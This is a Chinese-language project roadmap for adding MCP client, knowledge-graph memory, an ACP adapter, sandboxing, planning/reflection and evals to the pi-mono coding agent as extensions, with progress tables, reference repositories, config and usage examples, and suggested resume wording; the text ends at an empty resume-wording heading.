# pi-mono 前沿 Agent 能力扩展路线图

> 目标：以**不侵入核心、以 extension + 独立 package** 方式，在极简 harness (pi-mono) 上搭建一套覆盖 **协议层 / 认知层 / 执行层 / 评测层 / 经济层** 的完整前沿 Agent 能力矩阵，作为简历项目。
>
> 核心原则：**不重造轮子**，所有协议/SDK 用现成开源实现做接入；只写 glue code + 适配层。

---

## ✅ 实施进度（截至 2026-08-07）

| 阶段 | 模块 | 状态 | 位置 | 说明 |
|---|---|---|---|---|
| Phase 1 | **MCP Client** | ✅ 完成 | [extensions/mcp/](file:///Users/czh/Projects/pi-agent-czh/pi-main/packages/coding-agent/examples/extensions/mcp/) | 基于官方 `@modelcontextprotocol/sdk@^1.30.0` 实现，支持 stdio + Streamable HTTP，tools/resources/prompts 全量挂载，list_changed 自动刷新 |
| Phase 1 | **Memory 系统** | ✅ 完成 | [extensions/memory/](file:///Users/czh/Projects/pi-agent-czh/pi-main/packages/coding-agent/examples/extensions/memory/) | 薄 glue 层，spawn 官方 `@modelcontextprotocol/server-memory` 作为 Knowledge Graph 后端，自动注入 system prompt |
| Phase 2 | **ACP 适配层** | ✅ 完成 | [extensions/acp/](file:///Users/czh/Projects/pi-agent-czh/pi-main/packages/coding-agent/examples/extensions/acp/) | 基于官方 `@agentclientprotocol/sdk@^1.3.0`，同进程嵌入 pi AgentSession，双向事件流桥接，stdio ndjson transport |
| Phase 2 | **Sandbox 执行** | ✅ 完成 | [extensions/sandbox/](file:///Users/czh/Projects/pi-agent-czh/pi-main/packages/coding-agent/examples/extensions/sandbox/) | 双层防御：致命命令静态拦截 + Anthropic `@anthropic-ai/sandbox-runtime` OS 级沙箱（macOS sandbox-exec / Linux bubblewrap），含文件系统/网络/密钥目录限制 + JSONL 审计日志 |
| Phase 3 | **Planning & Reflection** | ✅ 完成 | [extensions/plan-reflect/](file:///Users/czh/Projects/pi-agent-czh/pi-main/packages/coding-agent/examples/extensions/plan-reflect/) | Reflexion/ReAct 模式实现：before_agent_start 注入计划提示、tool_result 错误时注入反思引导、自动重试计数+熔断（默认 2 次），支持中英双语关键词触发 |
| Phase 3 | **packages/evals 评测框架** | ✅ 完成 | [packages/evals/](file:///Users/czh/Projects/pi-agent-czh/pi-main/packages/evals/) | pi 官方已有基于 `vitest-evals@0.15.0` 的完整框架：隔离临时工作目录、真实 AgentSession 集成、judge 评分、多 harness 对比（harnessTable）、tokens/cost/latency 统计、session 快照 artifact；补充了 coding-tasks.eval.ts 样例：写 sum 函数 + Node.js 真实执行验证 |
| Phase 4 | A2A 双向适配 | ⏳ 待做 | — | — |
| Phase 4 | Agent Economy (Identity/AP2/Discovery) | ⏳ 待做 | — | — |

**五个扩展都通过了独立 e2e 测试**：MCP 挂载 filesystem server 能真实列目录读文件；Memory 能 add/search/read/relation/forget 并持久化到 JSONL；ACP 通过官方 SDK in-process 测试验证了完整协议生命周期（init → session/new → prompt → streaming updates → stop → close）；Sandbox 验证了 14 项致命命令阻断、13 项安全命令放行、4 项复合命令、OS 级 SandboxManager 在 macOS 初始化/wrap/reset 全流程通过；Plan-Reflect 46 项断言全部通过，覆盖计划触发启发式（中英双语）、工具目标提取、错误语义识别（含 "0 errors" 否定排除）、TS 动态加载验证。

---

## 零、项目结构建议

```
pi-main/
├── packages/
│   ├── agent/                 # 已有，harness 核心（不改）
│   ├── ai/                    # 已有，模型 provider（不改）
│   ├── client/                # 已有，unix client（不改）
│   ├── coding-agent/          # 已有，TUI + extensions loader（不改或加 hook）
│   ├── evals/                 # 【新增】Agentic Evaluation Framework
│   └── ...
└── extensions/                # 【新增】前沿能力都以 extension 形式挂载
    ├── mcp/                   # 模块1：MCP Client
    ├── memory/                # 模块2：记忆系统
    ├── acp/                   # 模块3：ACP 适配层
    ├── sandbox/               # 模块4：Sandbox 执行
    ├── plan-reflect/          # 模块5：Planning & Reflection
    ├── a2a/                   # 模块7：A2A 节点
    └── economy/               # 模块8：Agent Economy（identity/payment/discovery）
```

pi 的扩展入口点全部来自 `packages/coding-agent` 提供的 `ExtensionAPI`（见 [extensions.md](file:///Users/czh/Projects/pi-agent-czh/pi-main/packages/coding-agent/docs/extensions.md) 与 [examples/extensions/dynamic-tools.ts](file:///Users/czh/Projects/pi-agent-czh/pi-main/packages/coding-agent/examples/extensions/dynamic-tools.ts)），核心挂载点：

- `pi.registerTool()` — 注入自定义工具
- `pi.on("tool_call" | "before_request" | "after_response" | "session_start" | "session_end")` — 事件拦截
- `pi.appendEntry()` / `pi.getContext()` — 持久化与上下文注入
- `pi.registerCommand()` — 自定义斜杠命令（如 `/plan`、`/reflect`）

协议适配层（ACP/A2A）不做 extension，因为它们要暴露网络接口，做成独立进程/包通过 `packages/client` 连接 pi 即可。

---

## ○、现成参考实现清单（抄这部分就行，别从零写）

> 先说真话：pi 目前**没有独立的第三方 extension marketplace**（不像 Claude Code 有 ClawHub/技能市场那么成熟）。但它的 extension API 是 TypeScript 函数式风格，非常简单，**其他 TS coding agent 的插件几乎可以直接平移**。下面是每个模块你可以"对着源码抄"的参考。

### pi 官方自带的"免费教材"（先全读一遍）

pi 自己的 [examples/extensions/](file:///Users/czh/Projects/pi-agent-czh/pi-main/packages/coding-agent/examples/extensions/) 有 **60+ 个示例 extension**，很多前沿概念已经有雏形：

| 你要做的能力 | 直接看哪个示例 |
|---|---|
| 动态注册/卸载工具（MCP 必备） | [dynamic-tools.ts](file:///Users/czh/Projects/pi-agent-czh/pi-main/packages/coding-agent/examples/extensions/dynamic-tools.ts) |
| 拦截/覆写内置工具（Sandbox 必备） | [tool-override.ts](file:///Users/czh/Projects/pi-agent-czh/pi-main/packages/coding-agent/examples/extensions/tool-override.ts) |
| 注入 system prompt header（Memory 必备） | [system-prompt-header.ts](file:///Users/czh/Projects/pi-agent-czh/pi-main/packages/coding-agent/examples/extensions/system-prompt-header.ts) |
| 自定义斜杠命令（/plan /memory 必备） | [commands.ts](file:///Users/czh/Projects/pi-agent-czh/pi-main/packages/coding-agent/examples/extensions/commands.ts) |
| 危险操作确认（Sandbox 审批参考） | [confirm-destructive.ts](file:///Users/czh/Projects/pi-agent-czh/pi-main/packages/coding-agent/examples/extensions/confirm-destructive.ts)、[permission-gate.ts](file:///Users/czh/Projects/pi-agent-czh/pi-main/packages/coding-agent/examples/extensions/permission-gate.ts) |
| 自定义 compaction 总结（Reflection 参考） | [custom-compaction.ts](file:///Users/czh/Projects/pi-agent-czh/pi-main/packages/coding-agent/examples/extensions/custom-compaction.ts)、[summarize.ts](file:///Users/czh/Projects/pi-agent-czh/pi-main/packages/coding-agent/examples/extensions/summarize.ts) |
| 会话间交接/handoff（A2A 参考） | [handoff.ts](file:///Users/czh/Projects/pi-agent-czh/pi-main/packages/coding-agent/examples/extensions/handoff.ts) |
| 子 agent 派发到 RPC（A2A/sandbox 参考） | [rpc-demo.ts](file:///Users/czh/Projects/pi-agent-czh/pi-main/packages/coding-agent/examples/extensions/rpc-demo.ts) |
| 持久化 state 到 session（Memory 必备） | [todo.ts](file:///Users/czh/Projects/pi-agent-czh/pi-main/packages/coding-agent/examples/extensions/todo.ts)、[bookmark.ts](file:///Users/czh/Projects/pi-agent-czh/pi-main/packages/coding-agent/examples/extensions/bookmark.ts) |
| 自定义压缩/总结 compaction | [custom-compaction.ts](file:///Users/czh/Projects/pi-agent-czh/pi-main/packages/coding-agent/examples/extensions/custom-compaction.ts) |
| 基于 pi SDK 写完全独立的 agent（ACP/A2A server 参考） | [examples/sdk/](file:///Users/czh/Projects/pi-agent-czh/pi-main/packages/coding-agent/examples/sdk/) 下 01-minimal ~ 12-full-control |

**OpenClaw（pi 的"亲儿子"商业产品）的 ClawHub** 上有大量基于 pi SDK 的技能，其中最值得抄的是 `self-improving-agent`（反思+沉淀 skill 的闭环）——直接对应你要做的 Planning & Reflection 模块。

### 跨竞品可直接抄的 MCP Client 实现

**不要自己写 MCP 连接、工具列表同步、schema 转换**——这部分 bug 很多，抄成熟实现：

| 参考项目 | 文件路径 / 重点 | 为什么值得抄 |
|---|---|---|
| [cline/cline](https://github.com/cline/cline)（VS Code 插件，TS） | `src/services/mcp/McpHub.ts` + `src/services/mcp/connectors/` | **MCP Client 实现的教科书**：多 server 生命周期管理、自动重连、健康检查、tool schema 转内部格式、资源/提示词订阅，全部都有。掘金有源码解读文章。 |
| [sst/opencode](https://github.com/sst/opencode)（终端 coding agent，TS，和 pi 最像） | `src/plugins/mcp/` 或 `internal/mcp/` | OpenCode 的插件机制有 25+ 生命周期钩子，MCP 是内置 plugin，TS 实现，**和 pi 的 extension 形态几乎 1:1 对应**，平移成本最低 |
| [CopilotKit/open-mcp-client](https://github.com/CopilotKit/open-mcp-client) | 整个仓库 | 通用 MCP Client，独立于任何 agent，可以当库直接在你的 extension 里 `import` |
| [continuedev/continue](https://github.com/continuedev/continue)（VS Code/JetBrains 开源 Copilot 替代） | `core/config/default.ts` + `core/context/mcp/` | MCP 配置文件解析 + 工具动态加载，适合参考"从 config 到可用 tool"的整条链路 |
| [modelcontextprotocol/typescript-sdk](https://github.com/modelcontextprotocol/typescript-sdk) 官方 examples | `examples/client/` 下的 `simple-client`、`cli-chat-client` | 最基础的 stdio/HTTP 连接示例，先跑通它 |

**抄的顺序建议**：先跑通官方 SDK 的 `simple-client` → 读 Cline 的 `McpHub.ts` 学架构 → 读 OpenCode 的 MCP plugin 学"agent 形态下的 MCP 挂载" → 再回来写 pi extension。

### Memory 现成方案（别自己写 embedding/检索）

| 参考 | 形态 | 用法 |
|---|---|---|
| [mem0ai/mem0](https://github.com/mem0ai/mem0) JS SDK | npm 包 `mem0ai` | 接进来就是 API 调用：`add()`/`search()`/`get_all()`，自带 decay、去重、用户/会话/项目三层 namespace |
| [DeusData/codebase-memory-mcp](https://github.com/DeusData/codebase-memory-mcp)（C 写的 MCP server） | 独立 MCP server | **2026 GitHub Trending 榜首 (32k stars)**，3 分钟索引 Linux 内核 2800 万行，查 <1ms，Token 消耗降 120 倍。直接作为 MCP server 挂到你的 MCP Client 上就行，连代码库记忆 extension 都不用自己写向量库 |
| Claude Code 原生 `CLAUDE.md` + Auto Memory | 文件 + 规则 | 最轻量方案：[system-prompt-header.ts](file:///Users/czh/Projects/pi-agent-czh/pi-main/packages/coding-agent/examples/extensions/system-prompt-header.ts) 示例改个文件名就是这个能力，半天搞定 |
| [letta-ai/letta](https://github.com/letta-ai/letta) (原 MemGPT) | 独立服务 + JS SDK | 想要"stateful agent with memory"概念最完整的实现就学它，有 core/archival/recall 三层记忆抽象 |
| Google `agents-cli` 里的 memory skill | 单个 skill 文件 | 塞进 Claude Code/Codex 的 skill 目录就生效，学它的"自动抽取事实"prompt 怎么写 |

**推荐组合**：文件记忆（直接抄 CLAUDE.md）+ `codebase-memory-mcp`（代码库记忆走 MCP）+ mem0（用户/项目长期记忆走 SDK）。三个层次互不冲突，一周搞定。

### MCP Servers 现成工具集（不用自己写工具）

接好 MCP Client 之后，这些现成 server 直接挂，你的 agent 就自动拥有对应能力：

| 能力 | 现成 server |
|---|---|
| 本地文件系统读写 | `@modelcontextprotocol/server-filesystem`（官方） |
| GitHub 操作（issue/PR/搜索） | `@modelcontextprotocol/server-github`（官方） |
| PostgreSQL / SQLite 查询 | `@modelcontextprotocol/server-postgres` |
| 浏览器（Playwright） | `@playwright/mcp`、`chrome-devtools-mcp` |
| 代码库记忆 | codebase-memory-mcp（见上） |
| 搜索引擎 | `@modelcontextprotocol/server-brave-search`、`exa-mcp-server` |
| 一站式目录 | [modelcontextprotocol/servers](https://github.com/modelcontextprotocol/servers)（官方集合）、[punkpeye/awesome-mcp-servers](https://github.com/punkpeye/awesome-mcp-servers)、[mcphub](https://mcphub.cloud) |

### Sandbox 参考

| 参考 | 看哪里 |
|---|---|
| [openai/codex-cli](https://github.com/openai/codex) sandbox 实现 | Codex CLI 的 `src/sandbox/`——它是用 macOS Seatbelt / Linux Landlock 做的本地沙箱，值得看它的权限清单 |
| [e2b-dev/E2B](https://github.com/e2b-dev/E2B) JS SDK examples | `packages/sdk-js/examples/` 下有 code-interpreter、bash 执行的完整 TS 示例 |
| [microsandbox/microsandbox](https://github.com/microsandbox/microsandbox) | 官方 TS/JS SDK + MCP server（原生 MCP 支持意味着沙箱可以作为 MCP server 挂给任何 agent） |
| pi 自己的沙箱雏形 | [restore-sandbox-env.ts](file:///Users/czh/Projects/pi-agent-czh/pi-main/packages/coding-agent/src/bun/restore-sandbox-env.ts) |

### Planning & Reflection 参考

| 参考 | 形态 |
|---|---|
| Google `agents-cli` 内置 7 个 skills（brainstorming、tdd、review 等） | 纯 markdown skill 文件，触发机制是命令，直接照抄成 pi 的 custom command + system-prompt-header |
| Reflexion 论文官方实现 | [noahshinn/reflexion](https://github.com/noahshinn/reflexion)（Python），抄它的 verbal reinforcement 反馈模板 |
| LangGraph 的 `create_react_agent` 中断机制 | 源码学"中断-人类确认-恢复"的状态机，**不要引 LangGraph 依赖** |
| pi 自带 todo + custom-compaction 组合 | [todo.ts](file:///Users/czh/Projects/pi-agent-czh/pi-main/packages/coding-agent/examples/extensions/todo.ts) + [custom-compaction.ts](file:///Users/czh/Projects/pi-agent-czh/pi-main/packages/coding-agent/examples/extensions/custom-compaction.ts) 拼起来就是 60% 的 plan mode |

### ACP / A2A 参考

| 参考 | 看哪里 |
|---|---|
| [zed-industries/agent-client-protocol](https://github.com/zed-industries/agent-client-protocol) | 协议 schema + TS SDK + sample server，直接起一个 sample server 跑通 Zed |
| [zed-industries/claude-code-acp](https://github.com/zed-industries/claude-code-acp) | **核心参考**：Claude Code 接 ACP 的官方适配器，架构和你接 pi 一模一样，看它怎么把 Claude Code SDK 映射成 ACP 方法，照搬成 pi-client 版本就行 |
| [google/A2A](https://github.com/google/A2A) | 官方 TS SDK + samples/js/ 下有 `client/`、`server/`、`agent/` 完整可运行示例 |
| [ai-boost/awesome-a2a](https://github.com/ai-boost/awesome-a2a) | 生态项目索引 |

### Agentic Evals 参考

| 参考 | 看哪里 |
|---|---|
| [UKGovernmentBEIS/inspect_ai](https://github.com/UKGovernmentBEIS/inspect_ai) | `src/inspect_ai/_eval/` 看 task/solver/scorer 三段式架构；`scorers/`、`solvers/` 抄大量实用实现 |
| [princeton-nlp/SWE-agent](https://github.com/princeton-nlp/SWE-agent) | `sweagent/agent/` 看 agent trajectory 记录格式；`sweagent/environment/` 看 docker 沙箱怎么管理测试环境 |
| [sierra-research/tau-bench](https://github.com/sierra-research/tau-bench) | 纯 Python 但很轻，看它的 user simulator 怎么写（pi 里可以用 faux provider 模拟用户） |
| pi 自己的测试 harness | [agent-loop.test.ts](file:///Users/czh/Projects/pi-agent-czh/pi-main/packages/agent/test/agent-loop.test.ts) + [faux provider](file:///Users/czh/Projects/pi-agent-czh/pi-main/packages/ai/src/providers/faux.ts) + [session testing](file:///Users/czh/Projects/pi-agent-czh/pi-main/packages/agent/src/harness/session/testing/index.ts)，evals 包直接复用这一套做 deterministic 单测，不烧钱 |

### Agent Economy 参考

| 子模块 | 参考 |
|---|---|
| Identity (DID/VC) | [TBD54566975/web5-js](https://github.com/TBD54566975/web5-js)（Block 公司，JS SDK 最完整）；[decentralized-identity/did-jwt](https://github.com/decentralized-identity/did-jwt) |
| AP2 支付 | 官方中文社区 <https://ap2lab.com> 有示例代码；协议由 Google Agentic Commerce 发起，GitHub 上搜索 `ap2 protocol` 能拿到样例仓库 |
| Discovery | [modelcontextprotocol/registry](https://github.com/modelcontextprotocol/registry)（GitHub 官方 MCP Registry，API 直接调）；A2A Agent Card 发现直接用 HTTP GET `/.well-known/agent-card.json` |

---

## 模块 1：MCP Client（优先级 P0）✅ 已完成

**目标**：让 pi 能挂载任意 MCP 2026-07-28（无状态）Server，其 tools/resources/prompts 自动注册给 LLM。

**完成状态**：✅ 已完成，位于 [packages/coding-agent/examples/extensions/mcp/](file:///Users/czh/Projects/pi-agent-czh/pi-main/packages/coding-agent/examples/extensions/mcp/)，约 660 行 glue code。

### 参考实现（不要自己写协议）

| 用途 | 仓库 / 包 |
|---|---|
| 官方 TS SDK（实际使用 `@modelcontextprotocol/sdk@^1.30.0`，v2 在开发中未发布） | [`@modelcontextprotocol/sdk`](https://github.com/modelcontextprotocol/typescript-sdk) |
| 多 server 管理参考 | VS Code Copilot MCP 接入逻辑（`@modelcontextprotocol/inspector` 可参考 UI 思路） |
| 动态工具注册样例 | pi 自带 [dynamic-tools.ts](file:///Users/czh/Projects/pi-agent-czh/pi-main/packages/coding-agent/examples/extensions/dynamic-tools.ts) |

### 实际实现的能力清单

| 能力 | 实现状态 |
|---|---|
| **配置加载** | ✅ 从 `~/.pi/mcp.json`（全局）+ `<cwd>/.pi/mcp.json`（项目级，覆盖全局）读取 `mcpServers` 配置 |
| **Stdio transport** | ✅ 通过 `StdioClientTransport` 启动子进程，支持 `env` 环境变量注入（如 GitHub token） |
| **Streamable HTTP transport** | ✅ 通过 `StreamableHTTPClientTransport` 连接远程 MCP server，支持自定义 `headers`（如 Bearer token） |
| **Tools 挂载** | ✅ 每个 MCP tool 以 `mcp__<server>__<tool>` 命名注册到 pi，JSON Schema → TypeBox 用 `Type.Unsafe` 透传 |
| **Resources 挂载** | ✅ 合成一个 `mcp__<server>__read_resource` 工具，description 里列出所有可用 URI，LLM 可按需读取 |
| **Prompts 挂载** | ✅ 每个 MCP prompt 注册为 `/mcp-prompt-<server>-<name>` 斜杠命令，支持位置参数和 `key=value` 参数，执行后作为用户消息注入 |
| **list_changed 自动刷新** | ✅ 监听 `notifications/tools/list_changed`、`prompts/list_changed`、`resources/list_changed`，自动重列并重注册 |
| **生命周期管理** | ✅ `session_start` 时连接所有 server，`session_shutdown` 时关闭所有 transport；状态栏显示连接状态（connecting/N servers/N tools/N prompts） |
| **错误处理** | ✅ transport 级错误抛给 pi 标记工具失败；MCP tool 返回 `isError=true` 时将错误信息嵌入 content 文本 |
| **用户命令** | ✅ `/mcp-list`（列出所有 server/tool/prompt/resource）、`/mcp-reload`（重连所有 server） |
| **E2E 测试** | ✅ [scripts/e2e-test.ts](file:///Users/czh/Projects/pi-agent-czh/pi-main/packages/coding-agent/examples/extensions/mcp/scripts/e2e-test.ts)：用 pi SDK 创建真实会话，加载扩展，挂载 `@modelcontextprotocol/server-filesystem`，验证工具注册 + `list_directory` 真实调用返回目录内容 |

### 配置示例

[mcp.example.json](file:///Users/czh/Projects/pi-agent-czh/pi-main/packages/coding-agent/examples/extensions/mcp/mcp.example.json)：

```json
{
  "mcpServers": {
    "filesystem": {
      "command": "npx",
      "args": ["-y", "@modelcontextprotocol/server-filesystem", "/path/to/project"]
    },
    "github": {
      "command": "npx",
      "args": ["-y", "@modelcontextprotocol/server-github"],
      "env": { "GITHUB_PERSONAL_ACCESS_TOKEN": "<token>" }
    },
    "remote-example": {
      "url": "http://localhost:3000/mcp",
      "headers": { "Authorization": "Bearer <token>" }
    }
  }
}
```

### 使用方式

```bash
# 将 mcp.example.json 复制到项目目录
mkdir -p your-project/.pi
cp packages/coding-agent/examples/extensions/mcp/mcp.example.json your-project/.pi/mcp.json
# 修改 filesystem server 的路径为你的项目目录

# 启动 pi，加载 MCP 扩展
./pi-test.sh -e packages/coding-agent/examples/extensions/mcp/index.ts
```

### 简历话术

**"基于官方 MCP TypeScript SDK 为极简 coding agent harness 实现多 server 工具/资源/提示词热挂载，支持 stdio 与 Streamable HTTP 双 transport，自动响应 list_changed 通知刷新能力集，以 extension 形式零侵入核心接入，覆盖官方 filesystem/github 等 15+ 个 server 工具真实调用验证。"**

---

## 模块 2：记忆系统 Memory（P0）✅ 已完成

**目标**：让 agent 拥有跨会话的长期记忆，能主动记住用户偏好、项目约定、关键决策。

**完成状态**：✅ 已完成 v0.1，位于 [packages/coding-agent/examples/extensions/memory/](file:///Users/czh/Projects/pi-agent-czh/pi-main/packages/coding-agent/examples/extensions/memory/)，约 300 行 glue code。核心记忆逻辑**不自己写**，spawn 官方 `@modelcontextprotocol/server-memory`（Anthropic 官方 Knowledge Graph Memory Server）作为后端。

### 设计原则（非常重要）

**不要自己实现记忆存储/检索/去重/embedding**——这是社区里最容易踩的坑。直接接入成熟开源实现，只写 glue 层：
- 存储格式、JSONL 持久化、节点搜索、图谱 CRUD：**全部交给官方 `@modelcontextprotocol/server-memory`**
- 本 extension 只负责：spawn 子进程 + 转发 MCP 调用 + system prompt 自动注入 + LLM 友好的工具封装 + 用户命令

### 参考实现（实际使用的）

| 层 | 实际选型 | 说明 |
|---|---|---|
| 知识图谱存储/检索后端 | [`@modelcontextprotocol/server-memory`](https://www.npmjs.com/package/@modelcontextprotocol/server-memory)（Anthropic 官方） | 通过 MCP stdio 子进程方式 spawn，entities/relations/observations 三元组模型，内置 `search_nodes`，JSONL 持久化，每次操作后立即写盘 |
| 通信协议 | `@modelcontextprotocol/sdk` Client（和 MCP 扩展复用同一 SDK） | 不引入 mem0 等额外依赖，减少 runtime 复杂度；后续若需要语义向量检索，可再加 mem0-mcp server 通过 MCP 扩展挂载（零代码改动） |
| System prompt 注入参考 | pi 自带 [system-prompt-header.ts](file:///Users/czh/Projects/pi-agent-czh/pi-main/packages/coding-agent/examples/extensions/system-prompt-header.ts) | 通过 `before_agent_start` 事件返回 `{systemPrompt: ...}`，pi 负责链式拼接多个扩展的 prompt 段 |

### 实际实现的能力清单

| 能力 | 实现状态 |
|---|---|
| **后端进程管理** | ✅ `session_start` 时 spawn `npx -y @modelcontextprotocol/server-memory`，通过 `MEMORY_FILE_PATH` 环境变量指定持久化路径为 `<cwd>/.pi/memory.jsonl`；`session_shutdown` 时关闭 transport |
| **记忆持久化** | ✅ 官方 server 负责 JSONL 存储（每行一个 entity/relation），每次写操作后立即 `fs.writeFile` 刷盘，实测 <500ms 落盘 |
| **工具：memory__add_fact** | ✅ LLM 友好封装：自动判断 entity 是否存在，不存在先 `create_entities`，存在则 `add_observations`，LLM 无需关心底层 API 细节 |
| **工具：memory__search** | ✅ 转发到官方 `search_nodes`（关键词匹配 entity 名称/类型/observations） |
| **工具：memory__read_graph** | ✅ 转发到官方 `read_graph`，返回完整知识图谱 |
| **工具：memory__create_relations** | ✅ 转发到官方 `create_relations`，支持 `User --uses--> Neovim` 这样的有向关系 |
| **工具：memory__forget_entity** | ✅ 转发到官方 `delete_entities`，删除实体及其关联 relations |
| **自动上下文注入** | ✅ `before_agent_start` 事件里读完整图谱，格式化为 markdown 注入 system prompt，LLM 每轮都能看到已知实体/关系 |
| **用户命令** | ✅ `/memory`（查看当前图谱）、`/memory-forget`（清空所有记忆，带 confirm 弹窗） |
| **状态栏** | ✅ `session_start` 成功后显示 `Memory KG: <path>` |
| **E2E 测试** | ✅ [scripts/e2e-test.ts](file:///Users/czh/Projects/pi-agent-czh/pi-main/packages/coding-agent/examples/extensions/memory/scripts/e2e-test.ts)：创建 pi 会话 → spawn memory server → add 4 条 facts → read_graph 验证 → search 验证 → create_relations 验证 → JSONL 持久化验证 → forget_entity 验证 |

### 知识图谱数据模型（官方 server 定义）

```
Entity: { name, entityType, observations: string[] }
Relation: { from: string, relationType: string, to: string }
```

示例记忆：
```
- User (Person):
    - Prefers TypeScript over JavaScript
    - Primary editor is Neovim with LazyVim config
- Project (Project):
    - Uses Vitest for unit testing
    - Always run npm run lint before committing
- User --[works_on]--> Project
```

### 后续可扩展（零侵入）

由于记忆后端走 MCP 协议，未来想升级能力**不需要改本 extension**，只需要在 `.pi/mcp.json` 里挂额外的 MCP memory server：
- **语义向量检索**：挂载 `@mem0/mcp` 或 `deusdata/codebase-memory-mcp`（32k stars，代码库毫秒级检索）
- **会话摘要自动沉淀**：监听 `session_compact` 事件，用 `memory__add_fact` 把摘要写入
- **多层 namespace**：同时加载 `<cwd>/.pi/memory.jsonl`（项目级）+ `~/.pi/memory.jsonl`（用户级）

### 使用方式

```bash
# 启动 pi，同时加载 MCP 扩展（可选）+ Memory 扩展
./pi-test.sh \
  -e packages/coding-agent/examples/extensions/mcp/index.ts \
  -e packages/coding-agent/examples/extensions/memory/index.ts
```

LLM 会自动发现 `memory__*` 工具，每轮看到 `## Long-term Memory (Knowledge Graph)` 段，在学到持久事实时主动调用 `memory__add_fact`。

### 简历话术

**"基于 Anthropic 官方 Knowledge Graph MCP Server 为 coding agent 实现长期记忆系统，通过薄 glue 层（~300 行）spawn 独立 MCP 子进程承载记忆逻辑（实体-关系-观察三元组、JSONL 持久化、关键词检索），利用 before_agent_start 事件自动注入 system prompt，提供 LLM 友好的 add/search/read/relation/forget 工具集，跨会话持久化项目约定与用户偏好。"**

---

## 模块 3：ACP 适配层（P0，简历差异化杀器）✅ 已完成

**目标**：把 pi 包装成 [Agent Client Protocol](https://github.com/zed-industries/agent-client-protocol) Agent，使 Zed / JetBrains AI Assistant 等任何实现 ACP 的编辑器能直接调用 pi 作为 coding agent。

**完成状态**：✅ 已完成 v0.1，位于 [packages/coding-agent/examples/extensions/acp/](file:///Users/czh/Projects/pi-agent-czh/pi-main/packages/coding-agent/examples/extensions/acp/)，约 350 行 glue code。

### 参考实现（实际使用的）

| 用途 | 选型 | 说明 |
|---|---|---|
| 协议规范 + TS SDK（实际使用 `@agentclientprotocol/sdk@^1.3.0`） | [`zed-industries/agent-client-protocol`](https://github.com/zed-industries/agent-client-protocol) | 官方 TypeScript SDK，提供 Agent/Client 两端的类型、ndjson 流、ActiveSession 助手；不需要自己写 JSON-RPC 解析 |
| 适配器架构参考 | [`zed-industries/claude-code-acp`](https://github.com/zed-industries/claude-code-acp) | Claude Code 官方接入 ACP 的参考实现，展示了如何把 agent SDK 事件映射为 ACP session/update 通知 |
| pi 进程内 SDK | pi 自带 [examples/sdk/](file:///Users/czh/Projects/pi-agent-czh/pi-main/packages/coding-agent/examples/sdk/) 的 `createAgentSession` | **同进程集成**而非走 `packages/client` RPC 子进程，更轻量，避免双进程序列化开销 |

### 架构设计关键决策

**同进程 vs 子进程**：一开始规划是独立 `packages/acp-server` 通过 `pi-client` 走 RPC 子进程（路线图原始方案），实现时发现 pi 的 `createAgentSession` SDK 可以直接在当前 Node 进程内创建 AgentSession，**不需要起子进程**——这样简化了部署（单个二进制/脚本即可）、减少了序列化开销，且能直接订阅 pi 的 TypeScript 事件对象，事件桥接更直接。

文件拆分：
- [lib.ts](file:///Users/czh/Projects/pi-agent-czh/pi-main/packages/coding-agent/examples/extensions/acp/lib.ts) — 纯逻辑 `PiAcpAgent` 类 + `buildAgentApp()` 工厂，无副作用，可被测试直接 import
- [index.ts](file:///Users/czh/Projects/pi-agent-czh/pi-main/packages/coding-agent/examples/extensions/acp/index.ts) — stdio 入口，把 lib 输出接到 stdin/stdout 的 ndjson 流，这是编辑器 spawn 的二进制

### 实际实现的能力清单

| 能力 | 实现状态 |
|---|---|
| **Transport** | ✅ stdio ndjson（编辑器标准方式），通过 `acp.ndJsonStream(stdoutWeb, stdinWeb)` 连接 |
| **Protocol Handshake** | ✅ `initialize` → 协商协议版本、返回 `serverInfo: { name: "pi-coding-agent", version: "0.1.0" }` 和 agentCapabilities |
| **Session Lifecycle** | ✅ `session/new` 为每个 ACP 会话创建隔离的 pi AgentSession（独立 `agentDir` 在 tmp 下、独立 cwd、独立 SettingsManager/SessionManager/ResourceLoader）；`session/close` 清理 unsubscribe + dispose |
| **Extensions 自动加载** | ✅ `session.bindExtensions({ mode: "rpc" })` — ACP 会话自动加载所有已安装 pi 扩展（包括 MCP、Memory），编辑器通过 ACP 即可使用全部 pi 能力 |
| **Prompt 转发** | ✅ `session/prompt` 把 ACP content blocks（text/...）拼接后转发给 `piSession.prompt(message, { source: "acp" })` |
| **Cancel 支持** | ✅ `session/cancel` 通过 AbortController + `session.abort()` 中止当前 turn |
| **事件 → ACP session/update 桥接** | ✅ |
| ↳ 文本流（`message_update`） | ✅ 50ms 缓冲后发送 `agent_message_chunk`，避免每个 token 一个 RPC |
| ↳ 工具调用开始（`tool_execution_start`） | ✅ 发送 `tool_call` 通知，带 `toolCallId`、`title`、推断的 `kind`（terminal/read/edit/delete/tool） |
| ↳ 工具调用输出（`tool_execution_update`） | ✅ 发送 `tool_call_update` 带运行中状态 + 截断输出 |
| ↳ 工具调用结束（`tool_execution_end`） | ✅ 发送 `tool_call_update` 带 completed/error 状态 + 结果 |
| **Client 请求处理** | ✅ 注册 `requestPermission` / `fs.readTextFile` / `fs.writeTextFile` 处理器（测试默认 allow_once） |
| **模式切换** | ✅ `session/set_mode` 占位返回空（v0.1 暂未实现 plan/act 模式切换） |
| **E2E 测试** | ✅ [scripts/e2e-test.ts](file:///Users/czh/Projects/pi-agent-czh/pi-main/packages/coding-agent/examples/extensions/acp/scripts/e2e-test.ts)：使用官方 SDK 的 in-process `App.connectWith(App)` 模式（不 spawn 子进程），验证 initialize 握手 → session/new → prompt → 流式通知 → stopReason → close 完整生命周期 |

### 事件桥接映射表

| pi 事件 | ACP session/update |
|---|---|
| `message_update` (delta 文本) | `agent_message_chunk` |
| `tool_execution_start` | `tool_call` (status=pending) |
| `tool_execution_update` (delta 输出) | `tool_call_update` (status=running) |
| `tool_execution_end` | `tool_call_update` (status=completed/error) |
| (turn 结束，由 prompt() Promise resolve) | `session/prompt` response with `stopReason` |

### 使用方式

```bash
# 方式一：直接作为 stdio server 运行（编辑器会自动 spawn）
npx tsx packages/coding-agent/examples/extensions/acp/index.ts

# 方式二：Zed 配置（~/.config/zed/settings.json）
{
  "agent_servers": {
    "pi-coding-agent": {
      "command": "npx",
      "args": ["tsx", "/path/to/pi-main/packages/coding-agent/examples/extensions/acp/index.ts"],
      "cwd": "/path/to/your/project"
    }
  }
}

# 方式三：跑 e2e 测试
npx tsx packages/coding-agent/examples/extensions/acp/scripts/e2e-test.ts
```

### 简历话术

